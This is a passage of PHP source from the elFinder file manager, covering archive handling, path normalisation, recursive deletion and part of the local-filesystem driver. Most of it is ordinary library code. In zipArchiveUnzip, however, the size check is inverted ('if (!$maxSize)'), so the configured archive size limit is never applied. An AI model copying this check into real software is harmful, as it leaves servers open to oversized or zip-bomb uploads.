                $arcs['extract']['application/x-7z-compressed'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'x -y', 'ext' => '7z', 'toSpec' => '-o', 'getsize' => array('argc' => 'l', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]+([0-9]+)[^\r\n]+$/s', 'replace' => '$1'));
                if (empty($arcs['create']['application/zip'])) {
                    $arcs['create']['application/zip'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'a -tzip --', 'ext' => 'zip');
                }
                if (empty($arcs['extract']['application/zip'])) {
                    $arcs['extract']['application/zip'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'x -tzip -y', 'ext' => 'zip', 'toSpec' => '-o', 'getsize' => array('argc' => 'l', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]+([0-9]+)[^\r\n]+$/s', 'replace' => '$1'));
                }
                if (empty($arcs['create']['application/x-tar'])) {
                    $arcs['create']['application/x-tar'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'a -ttar --', 'ext' => 'tar');
                }
                if (empty($arcs['extract']['application/x-tar'])) {
                    $arcs['extract']['application/x-tar'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'x -ttar -y', 'ext' => 'tar', 'toSpec' => '-o', 'getsize' => array('argc' => 'l', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]+([0-9]+)[^\r\n]+$/s', 'replace' => '$1'));
                }
                if (substr(PHP_OS, 0, 3) === 'WIN' && empty($arcs['extract']['application/x-rar'])) {
                    $arcs['extract']['application/x-rar'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'x -trar -y', 'ext' => 'rar', 'toSpec' => '-o', 'getsize' => array('argc' => 'l', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]+([0-9]+)[^\r\n]+$/s', 'replace' => '$1'));
                }
            }
        }
        if (class_exists('ZipArchive', false)) {
            if (empty($arcs['create']['application/zip'])) {
                $arcs['create']['application/zip'] = array('cmd' => 'phpfunction', 'argc' => array('self', 'zipArchiveZip'), 'ext' => 'zip');
            }
            if (empty($arcs['extract']['application/zip'])) {
                $arcs['extract']['application/zip'] = array('cmd' => 'phpfunction', 'argc' => array('self', 'zipArchiveUnzip'), 'ext' => 'zip');
            }
        }
        $this->session->set($sessionKey, $arcs);
        return elFinder::$archivers = $arcs;
    }

    protected function getFullPath($path, $base)
    {
        $separator = $this->separator;
        $systemroot = $this->systemRoot;
        $base = (string)$base;
        if ($base[0] === $separator && substr($base, 0, strlen($systemroot)) !== $systemroot) {
            $base = $systemroot . substr($base, 1);
        }
        if ($base !== $systemroot) {
            $base = rtrim($base, $separator);
        }
        $sepquoted = preg_quote($separator, '#');
        $path = preg_replace('#' . $sepquoted . '+#', $separator, $path);
        $path = preg_replace('#(?<=^|' . $sepquoted . ')\.' . $sepquoted . '#', '', $path);
        if ($path === '') return $base;
        if (substr($path, 0, 3) === '..' . $separator) {
            $path = $base . $separator . $path;
        }
        $normreg = '#(' . $sepquoted . ')[^' . $sepquoted . ']+' . $sepquoted . '\.\.' . $sepquoted . '#';
        while (preg_match($normreg, $path)) {
            $path = preg_replace($normreg, '$1', $path, 1);
        }
        if ($path !== $systemroot) {
            $path = rtrim($path, $separator);
        }
        $path = str_replace('..' . $separator, '', $path);
        if ($path[0] === $separator || strpos($path, $systemroot) === 0) {
            return $path;
        }
        $preg_separator = '#' . $sepquoted . '#';
        if (substr($path, 0, 2) === '.' . $separator || $path[0] !== '.') {
            $arrn = preg_split($preg_separator, $path, -1, PREG_SPLIT_NO_EMPTY);
            if ($arrn[0] !== '.') {
                array_unshift($arrn, '.');
            }
            $arrn[0] = rtrim($base, $separator);
            return join($separator, $arrn);
        }
        return $path;
    }

    public function rmdirRecursive($dir)
    {
        return self::localRmdirRecursive($dir);
    }

    protected function makeArchive($dir, $files, $name, $arc)
    {
        if ($arc['cmd'] === 'phpfunction') {
            if (is_callable($arc['argc'])) {
                call_user_func_array($arc['argc'], array($dir, $files, $name));
            }
        } else {
            $cwd = getcwd();
            if (chdir($dir)) {
                foreach ($files as $i => $file) {
                    $files[$i] = '.' . DIRECTORY_SEPARATOR . basename($file);
                }
                $files = array_map('escapeshellarg', $files);
                $prefix = $switch = '';
                if ($arc['ext'] === 'zip' && strpos($arc['argc'], '-tzip') === false) {
                    $prefix = './';
                    $switch = '-- ';
                }
                $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . $prefix . escapeshellarg($name) . ' ' . $switch . implode(' ', $files);
                $err_out = '';
                $this->procExec($cmd, $o, $c, $err_out, $dir);
                chdir($cwd);
            } else {
                return false;
            }
        }
        $path = $dir . DIRECTORY_SEPARATOR . $name;
        return file_exists($path) ? $path : false;
    }

    protected function unpackArchive($path, $arc, $mode = true)
    {
        if (is_string($mode)) {
            $dir = $mode;
            $chdir = null;
            $remove = false;
        } else {
            $dir = dirname($path);
            $chdir = $dir;
            $remove = $mode;
        }
        $dir = realpath($dir);
        $path = realpath($path);
        if ($arc['cmd'] === 'phpfunction') {
            if (is_callable($arc['argc'])) {
                call_user_func_array($arc['argc'], array($path, $dir));
            }
        } else {
            $cwd = getcwd();
            if (!$chdir || chdir($dir)) {
                if (!empty($arc['getsize'])) {
                    $getsize = $arc['getsize'];
                    if (is_array($getsize) && !empty($getsize['regex']) && !empty($getsize['replace'])) {
                        $cmd = $arc['cmd'] . ' ' . $getsize['argc'] . ' ' . escapeshellarg($path) . (!empty($getsize['toSpec'])? (' ' . $getsize['toSpec']): '');
                        $this->procExec($cmd, $o, $c);
                        if ($o) {
                            $size = preg_replace($getsize['regex'], $getsize['replace'], trim($o));
                            $comp = function_exists('bccomp')? 'bccomp' : 'strnatcmp';
                            if (!empty($this->options['maxArcFilesSize'])) {
                                if ($comp($size, (string)$this->options['maxArcFilesSize']) > 0) {
                                    throw new Exception(elFinder::ERROR_ARC_MAXSIZE);
                                }
                            }
                        }
                        unset($o, $c);
                    }
                }
                if ($chdir) {
                    $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . escapeshellarg(basename($path));
                } else {
                    $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . escapeshellarg($path) . ' ' . $arc['toSpec'] . escapeshellarg($dir);
                }
                $this->procExec($cmd, $o, $c);
                $chdir && chdir($cwd);
            }
        }
        $remove && unlink($path);
    }

    protected function checkExtractItems($path, $checks = null)
    {
        if (is_null($checks) || !is_array($checks)) {
            $checks = array('symlink', 'name', 'writable', 'mime');
        }
        $chkSymlink = in_array('symlink', $checks);
        $chkName = in_array('name', $checks);
        $chkWritable = in_array('writable', $checks);
        $chkMime = in_array('mime', $checks);
        $res = array(
            'symlinks' => array(), 'names' => array(), 'writables' => array(),
            'mimes' => array(), 'rmNames' => array(), 'totalSize' => 0
        );
        if (is_dir($path)) {
            $files = self::localScandir($path);
        } else {
            $files = array(basename($path));
            $path = dirname($path);
        }
        foreach ($files as $name) {
            $p = $path . DIRECTORY_SEPARATOR . $name;
            $utf8Name = elFinder::$instance->utf8Encode($name);
            if ($name !== $utf8Name) {
                $fsSame = false;
                if ($this->encoding) {
                    $_utf8 = @iconv($this->encoding, 'utf-8//IGNORE', $name);
                    if (@iconv('utf-8', $this->encoding.'//IGNORE', $_utf8) === $name) {
                        $fsSame = true;
                        $utf8Name = $_utf8;
                    } else {
                        $_name = $this->convEncIn($utf8Name, true);
                    }
                } else {
                    $_name = $utf8Name;
                }
                if (!$fsSame && rename($p, $path . DIRECTORY_SEPARATOR . $_name)) {
                    $name = $_name;
                    $p = $path . DIRECTORY_SEPARATOR . $name;
                }
            }
            if (!is_readable($p)) {
                self::localRmdirRecursive($p);
                $res['symlinks'][] = $p;
                $res['rmNames'][] = $utf8Name;
                continue;
            }
            if ($chkSymlink && is_link($p)) {
                self::localRmdirRecursive($p);
                $res['symlinks'][] = $p;
                $res['rmNames'][] = $utf8Name;
                continue;
            }
            $isDir = is_dir($p);
            if ($chkName && !$this->nameAccepted($name, $isDir)) {
                self::localRmdirRecursive($p);
                $res['names'][] = $p;
                $res['rmNames'][] = $utf8Name;
                continue;
            }
            if ($chkWritable && !$this->attr($p, 'write', null, $isDir)) {
                self::localRmdirRecursive($p);
                $res['writables'][] = $p;
                $res['rmNames'][] = $utf8Name;
                continue;
            }
            if ($isDir) {
                $cRes = $this->checkExtractItems($p, $checks);
                foreach ($cRes as $k => $v) {
                    if (is_array($v)) {
                        $res[$k] = array_merge($res[$k], $cRes[$k]);
                    } else {
                        $res[$k] += $cRes[$k];
                    }
                }
            } else {
                if ($chkMime && ($mimeByName = elFinderVolumeDriver::mimetypeInternalDetect($name)) && !$this->allowPutMime($mimeByName)) {
                    self::localRmdirRecursive($p);
                    $res['mimes'][] = $p;
                    $res['rmNames'][] = $utf8Name;
                    continue;
                }
                $res['totalSize'] += (int)sprintf('%u', filesize($p));
            }
        }
        $res['rmNames'] = array_unique($res['rmNames']);
        return $res;
    }

    protected static function localScandir($dir)
    {
        $files = array();
        if ($dh = opendir($dir)) {
            while (false !== ($file = readdir($dh))) {
                if ($file !== '.' && $file !== '..') {
                    $files[] = $file;
                }
            }
            closedir($dh);
        } else {
            throw new Exception('Can not open local directory.');
        }
        return $files;
    }

    protected static function localRmdirRecursive($dir)
    {
        if (is_callable('exec')) {
            $o = '';
            $r = 1;
            if (substr(PHP_OS, 0, 3) === 'WIN') {
                if (!is_link($dir) && is_dir($dir)) {
                    exec('rd /S /Q ' . escapeshellarg($dir), $o, $r);
                } else {
                    exec('del /F /Q ' . escapeshellarg($dir), $o, $r);
                }
            } else {
                exec('rm -rf ' . escapeshellarg($dir), $o, $r);
            }
            if ($r === 0) {
                return true;
            }
        }
        if (!is_link($dir) && is_dir($dir)) {
            chmod($dir, 0777);
            if ($handle = opendir($dir)) {
                while (false !== ($file = readdir($handle))) {
                    if ($file === '.' || $file === '..') {
                        continue;
                    }
                    elFinder::extendTimeLimit(30);
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (!is_link($dir) && is_dir($path)) {
                        self::localRmdirRecursive($path);
                    } else {
                        chmod($path, 0666);
                        unlink($path);
                    }
                }
                closedir($handle);
            }
            return rmdir($dir);
        } else {
            chmod($dir, 0666);
            return unlink($dir);
        }
    }

    protected static function localMoveRecursive($src, $target, $overWrite = true, $copyJoin = true)
    {
        $res = false;
        if (!file_exists($target)) {
            return rename($src, $target);
        }
        if (!$copyJoin || !is_dir($target)) {
            if ($overWrite) {
                if (is_dir($target)) {
                    $del = self::localRmdirRecursive($target);
                } else {
                    $del = unlink($target);
                }
                if ($del) {
                    return rename($src, $target);
                }
            }
        } else {
            foreach (self::localScandir($src) as $item) {
                $res |= self::localMoveRecursive($src . DIRECTORY_SEPARATOR . $item, $target . DIRECTORY_SEPARATOR . $item, $overWrite, $copyJoin);
            }
        }
        return (bool)$res;
    }

    protected static function zipArchiveZip($dir, $files, $zipPath)
    {
        try {
            if ($start = is_string($zipPath)) {
                $zip = new ZipArchive();
                if ($zip->open($dir . DIRECTORY_SEPARATOR . $zipPath, ZipArchive::CREATE) !== true) {
                    $zip = false;
                }
            } else {
                $zip = $zipPath;
            }
            if ($zip) {
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        $zip->addEmptyDir($file);
                        $_files = array();
                        if ($handle = opendir($path)) {
                            while (false !== ($entry = readdir($handle))) {
                                if ($entry !== "." && $entry !== "..") {
                                    $_files[] = $file . DIRECTORY_SEPARATOR . $entry;
                                }
                            }
                            closedir($handle);
                        }
                        if ($_files) {
                            self::zipArchiveZip($dir, $_files, $zip);
                        }
                    } else {
                        $zip->addFile($path, $file);
                    }
                }
                $start && $zip->close();
            }
        } catch (Exception $e) {
            return false;
        }
        return true;
    }

    protected static function zipArchiveUnzip($zipPath, $toDir)
    {
        try {
            $zip = new ZipArchive();
            if ($zip->open($zipPath) === true) {
                $num = $zip->numFiles;
                $size = 0;
                $maxSize = empty(self::$maxArcFilesSize)? '' : (string)self::$maxArcFilesSize;
                $comp = function_exists('bccomp')? 'bccomp' : 'strnatcmp';
                for ($i = 0; $i < $num; $i++) {
                    $stat = $zip->statIndex($i);
                    $size += $stat['size'];
                    if (strpos((string)$size, 'E') !== false) {
                        throw new Exception(elFinder::ERROR_ARC_MAXSIZE);
                    }
                    if (!$maxSize) {
                        if ($comp($size, $maxSize) > 0) {
                            throw new Exception(elFinder::ERROR_ARC_MAXSIZE);
                        }
                    }
                }
                $zip->extractTo($toDir);
                $zip->close();
            }
        } catch (Exception $e) {
            throw $e;
        }
        return true;
    }

    protected static function localFindSymlinks($path)
    {
        if (is_link($path)) {
            return true;
        }
        if (is_dir($path)) {
            foreach (self::localScandir($path) as $name) {
                $p = $path . DIRECTORY_SEPARATOR . $name;
                if (is_link($p)) {
                    return true;
                }
                if (is_dir($p) && self::localFindSymlinks($p)) {
                    return true;
                }
            }
        }
        return false;
    }

    abstract protected function _dirname($path);
    abstract protected function _basename($path);
    abstract protected function _joinPath($dir, $name);
    abstract protected function _normpath($path);
    abstract protected function _relpath($path);
    abstract protected function _abspath($path);
    abstract protected function _path($path);
    abstract protected function _inpath($path, $parent);
    abstract protected function _stat($path);
    abstract protected function _subdirs($path);
    abstract protected function _dimensions($path, $mime);
    abstract protected function _scandir($path);
    abstract protected function _fopen($path, $mode = "rb");
    abstract protected function _fclose($fp, $path = '');
    abstract protected function _mkdir($path, $name);
    abstract protected function _mkfile($path, $name);
    abstract protected function _symlink($source, $targetDir, $name);
    abstract protected function _copy($source, $targetDir, $name);
    abstract protected function _move($source, $targetDir, $name);
    abstract protected function _unlink($path);
    abstract protected function _rmdir($path);
    abstract protected function _save($fp, $dir, $name, $stat);
    abstract protected function _getContents($path);
    abstract protected function _filePutContents($path, $content);
    abstract protected function _extract($path, $arc);
    abstract protected function _archive($dir, $files, $name, $arc);
    abstract protected function _checkArchivers();
    abstract protected function _chmod($path, $mode);
} // END class elFinderVolumeDriver

}

/* ===================== [embedded] elFinderVolumeLocalFileSystem ===================== */
if (!class_exists('elFinderVolumeLocalFileSystem', false)) {
if (!class_exists('RecursiveCallbackFilterIterator', false)) {
    class RecursiveCallbackFilterIterator extends RecursiveFilterIterator
    {
        private $callback;
        public function __construct(RecursiveIterator $iterator, $callback)
        {
            $this->callback = $callback;
            parent::__construct($iterator);
        }
        public function accept()
        {
            return call_user_func($this->callback, parent::current(), parent::key(), parent::getInnerIterator());
        }
        public function getChildren()
        {
            return new self($this->getInnerIterator()->getChildren(), $this->callback);
        }
    }
}

class elFinderVolumeLocalFileSystem extends elFinderVolumeDriver
{
    protected $driverId = 'l';
    protected $archiveSize = 0;
    protected $statOwner = false;
    private $quarantine;

    public function __construct()
    {
        $this->options['alias'] = '';
        $this->options['dirMode'] = 0755;
        $this->options['fileMode'] = 0644;
        $this->options['rootCssClass'] = 'elfinder-navbar-root-local';
        $this->options['followSymLinks'] = true;
        $this->options['detectDirIcon'] = '';
        $this->options['keepTimestamp'] = array('copy', 'move');
        $this->options['substituteImg'] = true;
        $this->options['statCorrector'] = null;
        if (DIRECTORY_SEPARATOR === '/') {
            $this->options['acceptedName'] = '/^[^\.\/\x00][^\/\x00]*$/';
        } else {
            $this->options['acceptedName'] = '/^[^\.\/\x00\\\:*?"<>|][^\/\x00\\\:*?"<>|]*$/';
        }
    }

    protected function init()
    {
        if (DIRECTORY_SEPARATOR !== '/') {
            foreach (array('path', 'tmbPath', 'tmpPath', 'quarantine') as $key) {
                if (!empty($this->options[$key])) {
                    $this->options[$key] = str_replace('/', DIRECTORY_SEPARATOR, $this->options[$key]);
                }
            }
            if (version_compare(PHP_VERSION, '7.1', '>=')) {
                $this->options['encoding'] = '';
                $this->options['locale'] = '';
            }
        }
        if (!$cwd = getcwd()) {
            return $this->setError('elFinder LocalVolumeDriver requires a result of getcwd().');
        }
        if (!isset($this->options['systemRoot'])) {
            if ($cwd[0] === DIRECTORY_SEPARATOR || $this->root[0] === DIRECTORY_SEPARATOR) {
                $this->systemRoot = DIRECTORY_SEPARATOR;
            } else if (preg_match('/^([a-zA-Z]:' . preg_quote(DIRECTORY_SEPARATOR, '/') . ')/', $this->root, $m)) {
                $this->systemRoot = $m[1];
            } else if (preg_match('/^([a-zA-Z]:' . preg_quote(DIRECTORY_SEPARATOR, '/') . ')/', $cwd, $m)) {
                $this->systemRoot = $m[1];
            }
        }
        $this->root = $this->getFullPath($this->root, $cwd);
        if (!empty($this->options['startPath'])) {
            $this->options['startPath'] = $this->getFullPath($this->options['startPath'], $this->root);
        }
        if (is_null($this->options['syncChkAsTs'])) {
            $this->options['syncChkAsTs'] = true;
        }
        if (is_null($this->options['syncCheckFunc'])) {
            $this->options['syncCheckFunc'] = array($this, 'localFileSystemInotify');
        }
        if (empty($this->options['statCorrector']) || !is_callable($this->options['statCorrector'])) {
            $this->options['statCorrector'] = null;
        }
        return true;
    }

    protected function configure()
    {
        $hiddens = array();
        $root = $this->stat($this->root);
        if (!empty($this->options['tmbPath'])) {
            if (strpos($this->options['tmbPath'], DIRECTORY_SEPARATOR) === false) {
                $hiddens['tmb'] = $this->options['tmbPath'];
                $this->options['tmbPath'] = $this->_abspath($this->options['tmbPath']);
            } else {
                $this->options['tmbPath'] = $this->_normpath($this->options['tmbPath']);
            }
        }
        if (!empty($this->options['tmpPath'])) {
            if (strpos($this->options['tmpPath'], DIRECTORY_SEPARATOR) === false) {
                $hiddens['temp'] = $this->options['tmpPath'];
                $this->options['tmpPath'] = $this->_abspath($this->options['tmpPath']);
            } else {
                $this->options['tmpPath'] = $this->_normpath($this->options['tmpPath']);
            }
        }
        $_quarantine = '';
        if (!empty($this->options['quarantine'])) {
            if (strpos($this->options['quarantine'], DIRECTORY_SEPARATOR) === false) {
                $_quarantine = $this->_abspath($this->options['quarantine']);
                $this->options['quarantine'] = '';
            } else {
                $this->options['quarantine'] = $this->_normpath($this->options['quarantine']);
            }
        } else {
            $_quarantine = $this->_abspath('.quarantine');
        }
        is_dir($_quarantine) && self::localRmdirRecursive($_quarantine);
        parent::configure();
        if (!$this->tmbPath && isset($hiddens['tmb'])) {
            unset($hiddens['tmb']);
        }
        if ($root['read'] && !$this->tmbURL && $this->URL) {
            if (strpos($this->tmbPath, $this->root) === 0) {
                $this->tmbURL = $this->URL . str_replace(DIRECTORY_SEPARATOR, '/', substr($this->tmbPath, strlen($this->root) + 1));
                if (preg_match("|[^/?&=]$|", $this->tmbURL)) {
                    $this->tmbURL .= '/';
                }
            }
        }
        $this->tmp = '';
        if (!empty($this->options['tmpPath'])) {
            if ((is_dir($this->options['tmpPath']) || mkdir($this->options['tmpPath'], $this->options['dirMode'], true)) && is_writable($this->options['tmpPath'])) {
                $this->tmp = $this->options['tmpPath'];
            } else {
                if (isset($hiddens['temp'])) {
                    unset($hiddens['temp']);
                }
            }
        }
        if (!$this->tmp && ($tmp = elFinder::getStaticVar('commonTempPath'))) {
            $this->tmp = $tmp;
        }
        $this->quarantine = '';
        if (!empty($this->options['quarantine'])) {
            if ((is_dir($this->options['quarantine']) || mkdir($this->options['quarantine'], $this->options['dirMode'], true)) && is_writable($this->options['quarantine'])) {
                $this->quarantine = $this->options['quarantine'];
            } else {
                if (isset($hiddens['quarantine'])) {
                    unset($hiddens['quarantine']);
                }
            }
        } else if ($_path = elFinder::getCommonTempPath()) {
            $this->quarantine = $_path;
        }
        if (!$this->quarantine) {
            if (!$this->tmp) {
                $this->archivers['extract'] = array();
                $this->disabled[] = 'extract';
            } else {
                $this->quarantine = $this->tmp;
            }
        }
        if ($hiddens) {
            foreach ($hiddens as $hidden) {
                $this->attributes[] = array(
                    'pattern' => '~^' . preg_quote(DIRECTORY_SEPARATOR . $hidden, '~') . '$~',
                    'read' => false, 'write' => false, 'locked' => true, 'hidden' => true
                );
            }
        }
        if (!empty($this->options['keepTimestamp'])) {
            $this->options['keepTimestamp'] = array_flip($this->options['keepTimestamp']);
        }
        $this->statOwner = (!empty($this->options['statOwner']));
        if (DIRECTORY_SEPARATOR !== '/') {
            if (!isset($this->options['plugin'])) {
                $this->options['plugin'] = array();
            }
            $this->options['plugin']['WinRemoveTailDots'] = array('enable' => true);
        }
    }

    public function localFileSystemInotify($path, $standby, $compare)
    {
        if (isset($this->sessionCache['localFileSystemInotify_disable'])) {
            return false;
        }
        $path = realpath($path);
        $mtime = filemtime($path);
        if (!$mtime) {
            return false;
        }
        if ($mtime != $compare) {
            return $mtime;
        }
        $inotifywait = defined('ELFINER_INOTIFYWAIT_PATH') ? ELFINER_INOTIFYWAIT_PATH : 'inotifywait';
        $standby = max(1, intval($standby));
        $cmd = $inotifywait . ' ' . escapeshellarg($path) . ' -t ' . $standby . ' -e moved_to,moved_from,move,close_write,delete,delete_self';
        $this->procExec($cmd, $o, $r);
        if ($r === 0) {
            clearstatcache();
            if (file_exists($path)) {
                $mtime = filemtime($path);
                return $mtime ? $mtime : time();
            } else {
                return 0;
            }
        } else if ($r === 2) {
            return $compare;
        }
        $this->sessionCache['localFileSystemInotify_disable'] = true;
        $this->session->set($this->id, $this->sessionCache);
        return false;
    }

    protected function _dirname($path) { return dirname($path); }
    protected function _basename($path) { return basename($path); }

    protected function _joinPath($dir, $name)
    {
        $dir = rtrim($dir, DIRECTORY_SEPARATOR);
        $path = realpath($dir . DIRECTORY_SEPARATOR . $name);
        if ($path === false || strpos($path, $this->root) !== 0) {
            if (DIRECTORY_SEPARATOR !== '/') {
                $dir = str_replace('/', DIRECTORY_SEPARATOR, $dir);
                $name = str_replace('/', DIRECTORY_SEPARATOR, $name);
            }
            if (strpos($dir, '..' . DIRECTORY_SEPARATOR) !== false || substr($dir, -2) == '..') {
                $dir = $this->root;
            }
            if (strpos($name, '..' . DIRECTORY_SEPARATOR) !== false) {
                $name = basename($name);
            }
            $path = $dir . DIRECTORY_SEPARATOR . $name;
        }
        return $path;
    }

    protected function _normpath($path)
    {
        if (empty($path)) {
            return '.';
        }
        $changeSep = (DIRECTORY_SEPARATOR !== '/');
        if ($changeSep) {
            $drive = '';
            if (preg_match('/^([a-zA-Z]:)(.*)/', $path, $m)) {
                $drive = $m[1];
                $path = $m[2] ? $m[2] : '/';
            }
            $path = str_replace(DIRECTORY_SEPARATOR, '/', $path);
        }
        if (strpos($path, '/') === 0) {
            $initial_slashes = true;
        } else {
            $initial_slashes = false;
        }
        if (($initial_slashes) && (strpos($path, '//') === 0) && (strpos($path, '///') === false)) {
            $initial_slashes = 2;
        }
        $initial_slashes = (int)$initial_slashes;
        $comps = explode('/', $path);
        $new_comps = array();
        foreach ($comps as $comp) {
            if (in_array($comp, array('', '.'))) {
                continue;
            }
            if (($comp != '..') || (!$initial_slashes && !$new_comps) || ($new_comps && (end($new_comps) == '..'))) {
                array_push($new_comps, $comp);
            } elseif ($new_comps) {
                array_pop($new_comps);
            }
        }
        $comps = $new_comps;
        $path = implode('/', $comps);
        if ($initial_slashes) {
            $path = str_repeat('/', $initial_slashes) . $path;
        }
        if ($changeSep) {
            $path = $drive . str_replace('/', DIRECTORY_SEPARATOR, $path);
        }
        return $path ? $path : '.';
    }

    protected function _relpath($path)
    {
        if ($path === $this->root) {
            return '';
        } else {
            if (strpos($path, $this->root) === 0) {
                return ltrim(substr($path, strlen($this->root)), DIRECTORY_SEPARATOR);
            } else {
                return $path;
            }
        }
    }

    protected function _abspath($path)
    {
        if ($path === DIRECTORY_SEPARATOR) {
            return $this->root;
        } else {
            $path = $this->_normpath($path);
            if (strpos($path, $this->systemRoot) === 0) {
                return $path;
            } else if (DIRECTORY_SEPARATOR !== '/' && preg_match('/^[a-zA-Z]:' . preg_quote(DIRECTORY_SEPARATOR, '/') . '/', $path)) {
                return $path;
            } else {
                return $this->_joinPath($this->root, $path);
            }
        }
    }

    protected function _path($path)
    {
        return $this->rootName . ($path == $this->root ? '' : $this->separator . $this->_relpath($path));
    }

    protected function _inpath($path, $parent)
    {
        $cwd = getcwd();
        $real_path = $this->getFullPath($path, $cwd);
        $real_parent = $this->getFullPath($parent, $cwd);
        if ($real_path && $real_parent) {
            return $real_path === $real_parent || strpos($real_path, rtrim($real_parent, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR) === 0;
        }
        return false;
    }

    protected function _stat($path)
    {
        $stat = array();
        if (!file_exists($path) && !is_link($path)) {
            return $stat;
        }
        if (!$this->_inpath($path, $this->root)) {
            return $stat;
        }
        $stat['isowner'] = false;
        $linkreadable = false;
        if ($path != $this->root && is_link($path)) {
            if (!$this->options['followSymLinks']) {
                return array();
            }
            if (!($target = $this->readlink($path)) || $target == $path) {
                if (is_null($target)) {
                    $stat = array();
                    return $stat;
                } else {
                    $stat['mime'] = 'symlink-broken';
                    $target = readlink($path);
                    $lstat = lstat($path);
                    $ostat = $this->getOwnerStat($lstat['uid'], $lstat['gid']);
                    $linkreadable = !empty($ostat['isowner']);
                }
            }
            $stat['alias'] = $this->_path($target);
            $stat['target'] = $target;
        }
        $readable = is_readable($path);
        if ($readable) {
            $size = sprintf('%u', filesize($path));
            $stat['ts'] = filemtime($path);
            if ($this->statOwner) {
                $fstat = stat($path);
                $uid = $fstat['uid'];
                $gid = $fstat['gid'];
                $stat['perm'] = substr((string)decoct($fstat['mode']), -4);
                $stat = array_merge($stat, $this->getOwnerStat($uid, $gid));
            }
        }
        if (($dir = is_dir($path)) && $this->options['detectDirIcon']) {
            $favicon = $path . DIRECTORY_SEPARATOR . $this->options['detectDirIcon'];
            if ($this->URL && file_exists($favicon)) {
                $stat['icon'] = $this->URL . str_replace(DIRECTORY_SEPARATOR, '/', substr($favicon, strlen($this->root) + 1));
            }
        }
        if (!isset($stat['mime'])) {
            $stat['mime'] = $dir ? 'directory' : $this->mimetype($path);
        }
        $stat['read'] = ($linkreadable || $readable) ? null : false;
        $stat['write'] = is_writable($path) ? null : false;
        if (is_null($stat['read'])) {
            if ($dir) {
                $stat['size'] = 0;
            } else if (isset($size)) {
                $stat['size'] = $size;
            }
        }
        if ($this->options['statCorrector']) {
            call_user_func_array($this->options['statCorrector'], array(&$stat, $path, $this->statOwner, $this));
        }
        return $stat;
    }

    protected function getOwnerStat($uid, $gid)
    {
        static $names = null;
        static $phpuid = null;
        if (is_null($names)) {
            $names = array('uid' => array(), 'gid' => array());
        }
        if (is_null($phpuid)) {
            if (is_callable('posix_getuid')) {
                $phpuid = posix_getuid();
            } else {
                $phpuid = 0;
            }
        }
        $stat = array();
        if ($uid) {
            $stat['isowner'] = ($phpuid == $uid);
            if (isset($names['uid'][$uid])) {
                $stat['owner'] = $names['uid'][$uid];
            } else if (is_callable('posix_getpwuid')) {
                $pwuid = posix_getpwuid($uid);
                $stat['owner'] = $names['uid'][$uid] = $pwuid['name'];
            } else {
                $stat['owner'] = $names['uid'][$uid] = $uid;
            }
        }
        if ($gid) {
            if (isset($names['gid'][$gid])) {
                $stat['group'] = $names['gid'][$gid];
            } else if (is_callable('posix_getgrgid')) {
                $grgid = posix_getgrgid($gid);
                $stat['group'] = $names['gid'][$gid] = $grgid['name'];
            } else {
                $stat['group'] = $names['gid'][$gid] = $gid;
            }
        }
        return $stat;
    }

    protected function _subdirs($path)
    {
        $dirs = false;
        if (is_dir($path) && is_readable($path)) {
            if (class_exists('FilesystemIterator', false)) {
                $dirItr = new ParentIterator(
                    new RecursiveDirectoryIterator($path,
                        FilesystemIterator::SKIP_DOTS |
                        FilesystemIterator::CURRENT_AS_SELF |
                        (defined('RecursiveDirectoryIterator::FOLLOW_SYMLINKS') ?
                            RecursiveDirectoryIterator::FOLLOW_SYMLINKS : 0)
                    )
                );
                $dirItr->rewind();
                if ($dirItr->hasChildren()) {
                    $dirs = true;
                    $name = $dirItr->getSubPathName();
                    while ($dirItr->valid()) {
                        if (!$this->attr($path . DIRECTORY_SEPARATOR . $name, 'read', null, true)) {
                            $dirs = false;
                            $dirItr->next();
                            $name = $dirItr->getSubPathName();
                            continue;
                        }
                        $dirs = true;
                        break;
                    }
                }
            } else {
                $path = strtr($path, array('[' => '\\[', ']' => '\\]', '*' => '\\*', '?' => '\\?'));
                return (bool)glob(rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '*', GLOB_ONLYDIR);
            }
        }
        return $dirs;
    }

    protected function _dimensions($path, $mime)
    {
        clearstatcache();
        return strpos($mime, 'image') === 0 && is_readable($path) && filesize($path) && ($s = getimagesize($path)) !== false
            ? $s[0] . 'x' . $s[1]
            : false;
    }

    protected function readlink($path)
    {
        if (!($target = readlink($path))) {
            return null;
        }
        if (strpos($target, $this->systemRoot) !== 0) {
            $target = $this->_joinPath(dirname($path), $target);
        }
        if (!file_exists($target)) {
            return false;
        }
        return $target;
    }

    protected function _scandir($path)
    {
        elFinder::checkAborted();
        $files = array();
        $cache = array();
        $dirWritable = is_writable($path);
        $dirItr = array();
        $followSymLinks = $this->options['followSymLinks'];
        try {
            $dirItr = new DirectoryIterator($path);
        } catch (UnexpectedValueException $e) {
        }
        foreach ($dirItr as $file) {
            try {
                if ($file->isDot()) {
                    continue;
                }
                $files[] = $fpath = $file->getPathname();
                $br = false;
                $stat = array();
                $stat['isowner'] = false;
                $linkreadable = false;
                if ($file->isLink()) {
                    if (!$followSymLinks) {
                        continue;
                    }
                    if (!($target = $this->readlink($fpath)) || $target == $fpath) {
                        if (is_null($target)) {
                            $stat = array();
                            $br = true;
                        } else {
                            $_path = $fpath;
                            $stat['mime'] = 'symlink-broken';
                            $target = readlink($_path);
                            $lstat = lstat($_path);
                            $ostat = $this->getOwnerStat($lstat['uid'], $lstat['gid']);
                            $linkreadable = !empty($ostat['isowner']);
                            $dir = false;
                            $stat['alias'] = $this->_path($target);
                            $stat['target'] = $target;
                        }
                    } else {
